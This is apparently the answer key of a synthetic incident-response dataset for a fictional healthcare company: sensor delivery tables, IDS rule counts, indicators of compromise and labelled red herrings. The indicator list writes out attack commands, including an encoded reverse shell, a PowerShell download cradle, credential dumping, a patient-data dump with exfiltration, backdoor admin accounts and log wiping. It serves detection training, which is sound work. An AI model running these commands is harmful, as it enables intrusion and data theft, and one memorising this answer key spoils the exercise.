| e1369119-1f43-414c-afd7-3bdbeb47c0c1 | ids | delayed: 1 |
| e227816e-16fb-4b4f-a50c-fef8ed3c8521 | ids | delayed: 1 |
| e3cc4325-a9a0-455e-9f53-53f89149e481 | ids | delayed: 1 |
| e40c7a68-9e1a-4e24-b9f0-45f1ca7f4a73 | ids | delayed: 1 |
| ea8f456d-2410-4ca3-a963-851c4412d577 | ids | delayed: 1 |
| eb080630-36eb-4f9c-a295-b6faaf7d584a | ids | delayed: 1 |
| ed8b593f-7416-430d-9ee4-7b33897592f8 | ids | delayed: 1 |
| evt-001 | asa | delayed: 6, filtered: 1 |
| evt-001 | ecar | delayed: 2 |
| evt-001 | ids | filtered: 1 |
| evt-001 | zeek | filtered: 9, visible: 4 |
| evt-002 | asa | delayed: 379, dropped: 1, filtered: 1, visible: 3 |
| evt-002 | ecar | delayed: 381, dropped: 3 |
| evt-002 | ids | delayed: 14 |
| evt-002 | web | delayed: 334, dropped: 3 |
| evt-002 | zeek | delayed: 495, dropped: 1, filtered: 2, visible: 224 |
| evt-003 | syslog | delayed: 3 |
| evt-003 | zeek | delayed: 2 |
| evt-004 | asa | delayed: 2 |
| evt-004 | ecar | delayed: 2 |
| evt-004 | web | delayed: 2 |
| evt-004 | zeek | delayed: 4 |
| evt-005 | asa | delayed: 2 |
| evt-005 | ecar | delayed: 4 |
| evt-005 | syslog | visible: 1 |
| evt-005 | web | delayed: 1 |
| evt-005 | zeek | delayed: 1, visible: 2 |
| evt-006 | asa | delayed: 31 |
| evt-006 | bash_history | visible: 7 |
| evt-006 | ecar | delayed: 52 |
| evt-006 | syslog | delayed: 5 |
| evt-006 | windows_security | delayed: 2 |
| evt-006 | zeek | delayed: 19, visible: 12 |
| evt-007 | bash_history | visible: 3 |
| evt-007 | ecar | delayed: 6 |
| evt-008 | asa | delayed: 3, filtered: 1 |
| evt-008 | ecar | delayed: 7 |
| evt-008 | ids | delayed: 2 |
| evt-008 | syslog | delayed: 4 |
| evt-008 | windows_security | delayed: 2 |
| evt-008 | zeek | delayed: 3, visible: 3 |
| evt-009 | bash_history | visible: 2 |
| evt-009 | ecar | delayed: 4 |
| evt-010 | ecar | delayed: 9 |
| evt-010 | sysmon | delayed: 9 |
| evt-010 | windows_security | delayed: 3 |
| evt-011 | ecar | delayed: 1 |
| evt-011 | syslog | delayed: 1 |
| evt-011 | windows_security | delayed: 1 |
| evt-012 | asa | delayed: 2, filtered: 5 |
| evt-012 | ecar | delayed: 16 |
| evt-012 | sysmon | delayed: 6 |
| evt-012 | windows_security | delayed: 24 |
| evt-012 | zeek | delayed: 6, visible: 2 |
| evt-013 | asa | delayed: 4, filtered: 1 |
| evt-013 | ecar | delayed: 47 |
| evt-013 | sysmon | delayed: 43 |
| evt-013 | windows_security | delayed: 22 |
| evt-013 | zeek | delayed: 4, visible: 4 |
| evt-014 | ecar | delayed: 13 |
| evt-014 | sysmon | delayed: 13 |
| evt-014 | windows_security | delayed: 2 |
| evt-015 | asa | delayed: 3 |
| evt-015 | ecar | delayed: 23 |
| evt-015 | sysmon | delayed: 21 |
| evt-015 | windows_security | delayed: 11 |
| evt-015 | zeek | delayed: 3, visible: 1 |
| evt-016 | ecar | delayed: 28, dropped: 7 |
| evt-016 | sysmon | delayed: 35 |
| evt-016 | windows_security | delayed: 10 |
| evt-017 | asa | delayed: 2 |
| evt-017 | ecar | delayed: 34 |
| evt-017 | sysmon | delayed: 33 |
| evt-017 | windows_security | delayed: 10, visible: 1 |
| evt-017 | zeek | delayed: 2, visible: 1 |
| evt-018 | asa | delayed: 22 |
| evt-018 | ecar | delayed: 30 |
| evt-018 | proxy | delayed: 10 |
| evt-018 | sysmon | delayed: 17, dropped: 1 |
| evt-018 | windows_security | delayed: 14 |
| evt-018 | zeek | delayed: 44, visible: 12 |
| evt-019 | asa | delayed: 4 |
| evt-019 | ecar | delayed: 4 |
| evt-019 | proxy | delayed: 4 |
| evt-019 | sysmon | delayed: 4 |
| evt-019 | zeek | delayed: 2, dropped: 1, visible: 5 |
| evt-020 | asa | delayed: 27, filtered: 266, visible: 1 |
| evt-020 | ecar | delayed: 292, dropped: 2 |
| evt-020 | ids | delayed: 6, dropped: 1, filtered: 251 |
| evt-020 | sysmon | delayed: 18 |
| evt-020 | windows_security | delayed: 309, visible: 3 |
| evt-020 | zeek | delayed: 433, dropped: 1, visible: 154 |
| evt-021 | asa | delayed: 91 |
| evt-021 | ecar | delayed: 87, dropped: 4 |
| evt-021 | ids | delayed: 18, filtered: 164 |
| evt-021 | windows_security | delayed: 90, visible: 1 |
| evt-021 | zeek | delayed: 142, visible: 40 |
| evt-022 | asa | delayed: 1 |
| evt-022 | ecar | delayed: 26 |
| evt-022 | sysmon | delayed: 25 |
| evt-022 | windows_security | delayed: 9 |
| evt-022 | zeek | delayed: 1 |
| evt-023 | asa | filtered: 4 |
| evt-023 | bash_history | visible: 12 |
| evt-023 | ecar | delayed: 42 |
| evt-023 | syslog | delayed: 10 |
| evt-023 | windows_security | delayed: 2 |
| evt-023 | zeek | delayed: 4, visible: 2 |
| evt-025 | asa | delayed: 3 |
| evt-025 | ecar | delayed: 32 |
| evt-025 | proxy | delayed: 1 |
| evt-025 | sysmon | delayed: 28 |
| evt-025 | windows_security | delayed: 8 |
| evt-025 | zeek | delayed: 2, visible: 4 |
| evt-026 | asa | delayed: 3, filtered: 3 |
| evt-026 | ecar | delayed: 7 |
| evt-026 | proxy | delayed: 3 |
| evt-026 | zeek | delayed: 14 |
| evt-027 | ecar | delayed: 1 |
| evt-027 | windows_security | delayed: 2 |
| evt-028 | bash_history | visible: 1 |
| evt-028 | ecar | delayed: 2 |
| evt-029 | bash_history | visible: 1 |
| evt-029 | ecar | delayed: 3 |
| evt-030 | asa | delayed: 2 |
| evt-030 | ecar | delayed: 28 |
| evt-030 | proxy | delayed: 1 |
| evt-030 | sysmon | delayed: 27 |
| evt-030 | windows_security | delayed: 7 |
| evt-030 | zeek | delayed: 6 |
| evt-031 | asa | filtered: 3 |
| evt-031 | ecar | delayed: 3 |
| evt-031 | windows_security | delayed: 3 |
| evt-031 | zeek | delayed: 4, visible: 2 |
| evt-032 | ecar | delayed: 18 |
| evt-032 | sysmon | delayed: 18 |
| evt-032 | windows_security | delayed: 4 |
| evt-033 | ecar | delayed: 12 |
| evt-033 | sysmon | delayed: 11 |
| evt-033 | windows_security | delayed: 12 |
| evt-034 | ecar | delayed: 2 |
| evt-034 | sysmon | delayed: 1 |
| evt-034 | windows_security | delayed: 2 |
| evt-035 | ecar | delayed: 2 |
| evt-035 | syslog | delayed: 2 |
| evt-email-001 | asa | delayed: 7, filtered: 3 |
| evt-email-001 | ecar | delayed: 15, dropped: 1 |
| evt-email-001 | proxy | delayed: 2 |
| evt-email-001 | syslog | delayed: 10 |
| evt-email-001 | sysmon | delayed: 7 |
| evt-email-001 | windows_security | delayed: 7 |
| evt-email-001 | zeek | delayed: 16, visible: 6 |
| evt-email-002 | asa | delayed: 2 |
| evt-email-002 | ecar | delayed: 3 |
| evt-email-002 | proxy | delayed: 1 |
| evt-email-002 | sysmon | delayed: 2 |
| evt-email-002 | windows_security | delayed: 1 |
| evt-email-002 | zeek | delayed: 4 |
| evt-email-003 | all | out_of_window: 15 |
| evt-email-003 | asa | delayed: 8, filtered: 2 |
| evt-email-003 | ecar | delayed: 31 |
| evt-email-003 | syslog | delayed: 14 |
| evt-email-003 | sysmon | delayed: 30 |
| evt-email-003 | windows_security | delayed: 21, visible: 1 |
| evt-email-003 | zeek | delayed: 17, visible: 7 |
| evt-email-004 | asa | delayed: 9, filtered: 4 |
| evt-email-004 | ecar | delayed: 31 |
| evt-email-004 | syslog | delayed: 20 |
| evt-email-004 | sysmon | delayed: 11 |
| evt-email-004 | windows_security | delayed: 9 |
| evt-email-004 | zeek | delayed: 23, visible: 11 |
| evt-email-005 | asa | delayed: 2 |
| evt-email-005 | ecar | delayed: 2 |
| evt-email-005 | syslog | delayed: 2 |
| evt-email-005 | windows_security | delayed: 1 |
| evt-email-005 | zeek | delayed: 2, visible: 2 |
| evt-email-006 | asa | delayed: 3 |
| evt-email-006 | ecar | delayed: 6 |
| evt-email-006 | syslog | delayed: 8 |
| evt-email-006 | sysmon | delayed: 5 |
| evt-email-006 | windows_security | delayed: 3 |
| evt-email-006 | zeek | delayed: 7, visible: 2 |
| evt-email-007 | asa | delayed: 7, filtered: 1 |
| evt-email-007 | ecar | delayed: 13 |
| evt-email-007 | syslog | delayed: 9 |
| evt-email-007 | windows_security | delayed: 4, visible: 1 |
| evt-email-007 | zeek | delayed: 11, visible: 11 |
| evt-email-008 | asa | delayed: 5, filtered: 2 |
| evt-email-008 | ecar | delayed: 25 |
| evt-email-008 | proxy | delayed: 1 |
| evt-email-008 | syslog | delayed: 11 |
| evt-email-008 | sysmon | delayed: 20 |
| evt-email-008 | windows_security | delayed: 7 |
| evt-email-008 | zeek | delayed: 14, visible: 4 |
| evt-email-009 | asa | delayed: 1 |
| evt-email-009 | ecar | delayed: 1 |
| evt-email-009 | syslog | delayed: 2 |
| evt-email-009 | sysmon | delayed: 1 |
| evt-email-009 | windows_security | delayed: 1 |
| evt-email-009 | zeek | visible: 2 |
| evt-email-010 | asa | delayed: 1 |
| evt-email-010 | ecar | delayed: 1 |
| evt-email-010 | syslog | delayed: 2 |
| evt-email-010 | zeek | delayed: 5 |
| evt-email-011 | asa | delayed: 7, filtered: 3 |
| evt-email-011 | ecar | delayed: 15 |
| evt-email-011 | proxy | delayed: 1 |
| evt-email-011 | syslog | delayed: 9 |
| evt-email-011 | sysmon | delayed: 10 |
| evt-email-011 | windows_security | delayed: 11 |
| evt-email-011 | zeek | delayed: 15, visible: 12 |
| f0cf25cf-53eb-4e60-ba0d-65739f42e583 | ids | delayed: 1 |
| f10cbb88-b079-4c2f-bf1e-b792b31b69d4 | ids | delayed: 1 |
| f544b7c5-55bf-4444-9edd-fefb2c9964fa | ids | delayed: 2 |
| f5fe66e5-6ddc-4916-972b-622daff8537d | ids | delayed: 1 |
| f6f294a2-446a-4c6f-b4cd-e4090a6e1cb3 | ids | delayed: 1 |
| f8dd6666-f650-437f-9bd4-e61bad7e802d | ids | delayed: 1 |
| f9864fcd-6834-47ba-896b-4d7a1a31f2c5 | ids | delayed: 2 |
| f9e2ebe3-68fe-4006-beef-31f711ac881b | ids | delayed: 1 |
| fdbc9572-513d-49b5-94c1-47ffb9c2a447 | ids | delayed: 2 |
| ff91877c-0848-4a11-ba86-e4d0c87d592e | ids | delayed: 1 |
| red_herring:rh-001 | ecar | delayed: 8 |
| red_herring:rh-001 | sysmon | delayed: 4 |
| red_herring:rh-001 | windows_security | delayed: 6, visible: 2 |
| red_herring:rh-002 | asa | delayed: 1 |
| red_herring:rh-002 | ecar | delayed: 37 |
| red_herring:rh-002 | sysmon | delayed: 36 |
| red_herring:rh-002 | windows_security | delayed: 11, visible: 1 |
| red_herring:rh-002 | zeek | delayed: 1 |
| red_herring:rh-003 | asa | delayed: 4 |
| red_herring:rh-003 | ecar | delayed: 7 |
| red_herring:rh-003 | ids | visible: 1 |
| red_herring:rh-003 | proxy | delayed: 1 |
| red_herring:rh-003 | windows_security | delayed: 2 |
| red_herring:rh-003 | zeek | delayed: 6, visible: 2 |


## IDS Evaluation Summary

Observation totals: delayed=184, dropped=1, filtered=417, visible=4.

| Sensor | GID:SID | Candidates | Emitted | Policy Filtered | Origins | Digest |
|--------|---------|------------|---------|-----------------|---------|--------|
| snort-core | 1:2000334 | 1 | 1 | 0 | built_in=1 | `69fdfc6a916d` |
| snort-core | 1:2000560 | 1 | 1 | 0 | built_in=1 | `2e505e1f469b` |
| snort-core | 1:2002911 | 1 | 1 | 0 | authored_attachment=1 | `cf223cc86b09` |
| snort-core | 1:2003068 | 2 | 2 | 0 | built_in=2 | `d775844cb64f` |
| snort-core | 1:2016149 | 5 | 5 | 0 | built_in=5 | `e86b4b121ca4` |
| snort-core | 1:2024291 | 11 | 11 | 0 | built_in=11 | `d7c814ddc5e9` |
| snort-core | 1:2027757 | 8 | 8 | 0 | built_in=8 | `1d51404a35c7` |
| snort-core | 1:2027863 | 8 | 8 | 0 | built_in=8 | `028057bd769b` |
| snort-core | 1:2027865 | 102 | 20 | 82 | authored_attachment=9, built_in=11 | `c49595f9fe1f` |
| snort-core | 1:2029706 | 259 | 8 | 251 | authored_attachment=6, built_in=2 | `c6d9c107e4e4` |
| snort-core | 1:382 | 1 | 1 | 0 | built_in=1 | `44ca67b64177` |
| snort-perimeter | 1:2000334 | 2 | 2 | 0 | built_in=2 | `dea8497ce03d` |
| snort-perimeter | 1:2000357 | 1 | 1 | 0 | built_in=1 | `cbb8c0d3d0ef` |
| snort-perimeter | 1:2000428 | 8 | 8 | 0 | built_in=8 | `ad15a5d84689` |
| snort-perimeter | 1:2000560 | 2 | 2 | 0 | built_in=2 | `df819fe16cbe` |
| snort-perimeter | 1:2000575 | 3 | 3 | 0 | built_in=3 | `bfd49571c1df` |
| snort-perimeter | 1:2002910 | 15 | 14 | 1 | built_in=14 | `cbb79fa7dfe6` |
| snort-perimeter | 1:2002911 | 1 | 1 | 0 | authored_attachment=1 | `0cd8636abaf2` |
| snort-perimeter | 1:2003068 | 4 | 4 | 0 | built_in=4 | `912dd5b0d5a1` |
| snort-perimeter | 1:2010935 | 2 | 2 | 0 | built_in=2 | `2a73b151b3ca` |
| snort-perimeter | 1:2013028 | 2 | 2 | 0 | built_in=2 | `3f9881d6c7bb` |
| snort-perimeter | 1:2013504 | 4 | 4 | 0 | authored_attachment=1, built_in=3 | `ec08396ecbf0` |
| snort-perimeter | 1:2016149 | 3 | 3 | 0 | built_in=3 | `203347516a08` |
| snort-perimeter | 1:2016360 | 2 | 2 | 0 | built_in=2 | `bc38e4e63d96` |
| snort-perimeter | 1:2018959 | 2 | 2 | 0 | built_in=2 | `dc3b6f56961b` |
| snort-perimeter | 1:2022476 | 2 | 2 | 0 | built_in=2 | `b5ea41f5e704` |
| snort-perimeter | 1:2023672 | 1 | 1 | 0 | built_in=1 | `f8b3a6e7e58b` |
| snort-perimeter | 1:2023882 | 2 | 2 | 0 | built_in=2 | `a0a8c3af4db8` |
| snort-perimeter | 1:2024290 | 4 | 4 | 0 | built_in=4 | `af90d7d16a30` |
| snort-perimeter | 1:2024291 | 5 | 5 | 0 | built_in=5 | `18464be9364f` |
| snort-perimeter | 1:2024392 | 4 | 4 | 0 | built_in=4 | `00df91fd8050` |
| snort-perimeter | 1:2024897 | 4 | 4 | 0 | built_in=4 | `62e2f250ac36` |
| snort-perimeter | 1:2025712 | 2 | 2 | 0 | built_in=2 | `62352e4502b7` |
| snort-perimeter | 1:2025991 | 1 | 1 | 0 | built_in=1 | `8ae5ad7425b9` |
| snort-perimeter | 1:2027316 | 4 | 4 | 0 | built_in=4 | `2f75d84c8ae2` |
| snort-perimeter | 1:2027757 | 1 | 1 | 0 | built_in=1 | `c54f3df11afc` |
| snort-perimeter | 1:2027863 | 7 | 7 | 0 | built_in=7 | `aa8c7207f380` |
| snort-perimeter | 1:2027865 | 99 | 17 | 82 | authored_attachment=9, built_in=8 | `f37d5549d201` |
| snort-perimeter | 1:2028401 | 4 | 4 | 0 | built_in=4 | `c95ccc7690ec` |
| snort-perimeter | 1:2029706 | 2 | 2 | 0 | built_in=2 | `512c7d61600f` |
| snort-perimeter | 1:366 | 4 | 4 | 0 | built_in=4 | `7ca457dad517` |
| snort-perimeter | 1:382 | 4 | 4 | 0 | built_in=4 | `bf61d6176de5` |
| snort-perimeter | 1:384 | 4 | 4 | 0 | built_in=4 | `39e163987a5f` |


## Indicators of Compromise (IOCs)

### Network IOCs

- 10.10.1.35 (Attacker IP)
- 10.10.1.35:3389 (Lateral Movement)
- 10.10.1.99 (Attacker IP)
- 10.10.2.10:389 (Internal Server)
- 10.10.2.30:22 (Lateral Movement)
- 10.10.3.10:443 (Web Scan Target)
- 10.10.3.20:22 (Internal Server)
- 10.10.4.10:22 (Lateral Movement)
- 203.14.220.10:443 (C2 Server)
- 2j3rhpi2329sn.top (DGA Domain)
- 30rgw6r7503.top (DGA Domain)
- 45.33.32.30:443 (Beacon Target)
- 45.33.32.30:443 (C2 Server)
- 45.33.32.30:443 (Denied Beacon Target)
- 45.33.32.30:8443 (C2 Server)
- 6cja6syvo02mu.top (DGA Domain)
- DC-01.meridianhcs.local (Malicious DNS Query)
- Message-ID: <100000I9EMNA.1000OREDIL@meridianhcs.com>
- Message-ID: <1000016ONZTK.10015EDCND@meridianhcs.com>
- Message-ID: <121609FF-AFF2-1350-BCEC-8A52032BE7D0@meridianhcs.com>
- Message-ID: <1486572785.976919.3e76dbd7@meridianhcs.com>
- Message-ID: <1746897100.499514.89c6aefa@meridianhcs.com>
- Message-ID: <billing-a1f65b41-3807664@medclaims-processing.net>
- Message-ID: <notices-b9dac45a-8235363@benefits-serviceportal.com>
- Message-ID: <workspace-e2b1dcaf-9440641@docflow-health.net>
- Port 22 (scan target)
- Port 3306 (scan target)
- Port 443 (scan target)
- Port 80 (scan target)
- Port 8080 (scan target)
- Port 8443 (scan target)
- SMTP Zeek UID: C1Rl4UGKz5Uka1xh1EV
- SMTP Zeek UID: C2BmQnaQuRBFIPxayj
- SMTP Zeek UID: C4hNpyCprYUxGEv4TFH
- SMTP Zeek UID: C5ZEhjP3WxUzTFQVNK
- SMTP Zeek UID: C5nZWNm9u1TqGu4KxMR
- SMTP Zeek UID: CDo6jFLwGYxZwN0n6Yd
- SMTP Zeek UID: CGFsNImqlPGsuauj5I
- SMTP Zeek UID: CPwyThcCP7Yx8wockF2
- SMTP Zeek UID: CXK34ozzZ6rBbhpOQn9
- SMTP Zeek UID: CXqk0WmlFIb6Z9PF5VK
- SMTP Zeek UID: ChzfolliTxka9IL1F9
- SMTP Zeek UID: CjLAfXBZpJDrMYQLTb
- SMTP Zeek UID: CjuSoT03TZEDO8BZvto
- SMTP Zeek UID: ClZzaHKYXqGWV0coB
- SMTP Zeek UID: Ct9WGEmkfDNkNsjUqk
- Zeek UID: C1GwDJNo8eHHAEvaZ
- Zeek UID: C3pYm5i1AOOFxYTh2g
- Zeek UID: CArHKJcRlS83qY2bLE
- Zeek UID: CDCUiHs9GDiSFQPr1F
- Zeek UID: CIbHZiwoarQuuWTqQy
- Zeek UID: CLfHpnmrjGNXZmSuRMR
- Zeek UID: CXkly27XMEUk6y2oHja
- Zeek UID: CpgA1tT5kkWbOAKBQ
- Zeek UID: Cvm8JAuiDCkmwPGMo
- Zeek UID: Cy02yCZwpORihtTX6k
- api.westbridge-services.net (Malicious DNS Query)
- edge.westbridge-services.net (Malicious DNS Query)
- ewnjsaqf1rasgez5.top (DGA Domain)
- metrics.westbridge-services.net (Malicious DNS Query)
- ns1.westbridge-services.cloud (DNS Tunnel Endpoint)
- qrdqtp5nhn66chp00.top (DGA Domain)

### Process IOCs

- /bin/bash
- /usr/bin/cat
- /usr/bin/find
- /usr/bin/gzip
- /usr/bin/ls
- /usr/bin/mysqldump
- /usr/bin/nmap
- /usr/bin/scp
- /usr/bin/shred
- /usr/sbin/ip
- C:\Windows\System32\PSEXESVC.exe
- C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
- C:\Windows\System32\cmd.exe
- C:\Windows\System32\ms-index-service.exe
- C:\Windows\System32\net.exe
- C:\Windows\System32\sc.exe
- C:\Windows\System32\schtasks.exe
- C:\Windows\System32\wevtutil.exe
- C:\Windows\System32\whoami.exe
- Injection Target: C:\Windows\System32\lsass.exe
- Scheduled Task: \Microsoft\Windows\Maintenance\DeviceSync
- Service: DeviceSyncSvc
- Service: PSEXESVC
- `PSEXESVC.exe -accepteula`
- `bash -c 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC80NS4zMy4zMi4zMC84NDQzIDA+JjEi | base64 -d | bash'`
- `cat /etc/hosts`
- `cat /etc/passwd`
- `cat /etc/resolv.conf`
- `cat /etc/shadow`
- `cat /root/.ssh/id_rsa`
- `cat /var/www/html/config.php`
- `cmd.exe /c whoami && hostname`
- `find /opt/ehr -name '*credential*' -maxdepth 3`
- `gzip -9 /tmp/rpt_0318.sql`
- `history -c && cat /dev/null > ~/.bash_history`
- `ip addr show`
- `ls -la /root/.ssh`
- `ms-index-service.exe "privilege::debug" "sekurlsa::logonpasswords" exit`
- `mysqldump --single-transaction ehr patients insurance_claims > /tmp/rpt_0318.sql`
- `net group "Domain Admins" /domain`
- `net group "Domain Admins" svc_mhsync /add /domain`
- `net user /domain`
- `net user svc_mhsync /delete /domain`
- `net user svc_mhsync MhsSvc!2024 /add /domain`
- `net view /domain`
- `net view \\FILE-SRV-01`
- `nmap -sT -p 22,80,443,445,3306 10.10.2.0/24`
- `nmap -sn 10.10.2.0/24`
- `powershell.exe -NoProfile -Command "Compress-Archive -Path \\FILE-SRV-01\Finance\Q1\*,\\FILE-SRV-01\Patients\Exports\* -DestinationPath C:\ProgramData\Microsoft\cache_7f3a.zip"`
- `powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwBhAHAAaQAuAHcAZQBzAHQAYgByAGkAZABnAGUALQBzAGUAcgB2AGkAYwBlAHMALgBuAGUAdAAvAHYAMgAvAG0AYQBuAGkAZgBlAHMAdAAiACkA`
- `sc.exe create DeviceSyncSvc binPath= C:\Windows\System32\DeviceSyncSvc.exe obj= LocalSystem start= auto`
- `schtasks.exe /Create /TN "\Microsoft\Windows\Maintenance\DeviceSync" /SC HOURLY /TR "C:\Windows\System32\DeviceSyncSvc.exe" /RU SYSTEM`
- `scp /tmp/rpt_0318.sql.gz root@10.10.2.30:/tmp/.cache/rpt_0318.sql.gz`
- `shred -u /root/.bash_history`
- `wevtutil cl Security`
- `whoami /all`

### User IOCs

- Group: Domain Admins (compromised account)
- SYSTEM (compromised account)
- aisha.johnson (compromised account)
- aisha.johnson (Spray Target) (compromised account)
- apache (compromised account)
- diego.ramirez (compromised account)
- diego.ramirez (Spray Target) (compromised account)
- evelyn.brooks (compromised account)
- lina.nguyen (compromised account)
- marcus.chen (compromised account)
- marcus.chen (Explicit Credential Target) (compromised account)
- omar.haddad (compromised account)
- priya.patel (compromised account)
- root (compromised account)
- sophia.martinez (Spray Target) (compromised account)
- svc_mhsync (compromised account)

### File IOCs

- %SystemRoot%\PSEXESVC.exe
- /root/.bash_history
- /tmp/rpt_0318.sql
- C:\Windows\System32\DeviceSyncSvc.exe
- artifacts/email/benefits-confirmation-msg.eml
- artifacts/email/docflow-ai-summary-msg.eml
- artifacts/email/ehr-release-note-msg.eml
- artifacts/email/executive-operating-note-msg.eml
- artifacts/email/finance-forward-to-it-msg.eml
- artifacts/email/internal-reset-lure-msg.eml
- artifacts/email/vendor-interface-package-msg.eml


## Red Herrings

The following events appear suspicious but are benign. They are included to make the dataset more realistic.

| Timestamp | Actor | System | Activity | Why It's Benign |
|-----------|-------|--------|----------|-----------------|
| 2024-03-18 13:05:03 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 13:05:11 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 13:05:14 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 13:05:15 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 14:04:53 UTC | lina.nguyen | WS-LNGUYEN-01 | Developer refreshes Ubuntu package metadata from the public archive | Routine package maintenance uses the APT HTTP user agent and triggers a low-priority policy alert. |
| 2024-03-18 17:09:44 UTC | marcus.chen | DC-01 | Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01 | Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics. |
| 2024-03-18 17:09:45 UTC | marcus.chen | DC-01 | Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01 | Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics. |
| 2024-03-18 17:09:47 UTC | marcus.chen | DC-01 | Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01 | Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics. |
